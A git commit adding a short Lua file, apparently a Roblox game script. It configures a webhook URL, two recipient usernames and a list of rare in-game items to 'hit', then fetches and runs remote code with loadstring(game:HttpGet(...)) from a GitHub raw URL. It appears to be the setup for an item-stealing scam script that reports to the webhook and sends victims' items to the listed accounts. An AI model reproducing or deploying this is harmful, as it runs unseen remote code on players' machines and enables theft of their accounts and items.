6c0d74be47944a8811185f8e3fab2f45c3e81e7f
Argeddon <rambocracj@gmail.com>
2025-04-02 13:20:34 -0500

    ProyecT1.lua

---
+++ proyecT1.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=dFljMC1DWW5ockQ1TnV3anRpcUxmQTpvM3ZfUU1aN3NLNVlyVWc0enc0TUJSYUE1Tll6ekhVSHNGX00yYmRkMWkwVS14VW53Sjd0akgwOXY2SEJQN3dyaEdrclhMcjh6di1kWndQUmVXc3BfQmstb3dfN0Y5Q0tZUlY0MGhjSHZBZzFZUjNtX0FBWHpzaVhEWXU3VG5VZDFVc0JIYXR5cnd0UGZhNGZlTzhaejl3aDBRNUdHLTdkMkswMzRWWmVGWGc" -- << Your Webhook
+Usernames = {"jjefferson623", "somealtuserhere2"}
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Gravity", "Sound", "Phoenix"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
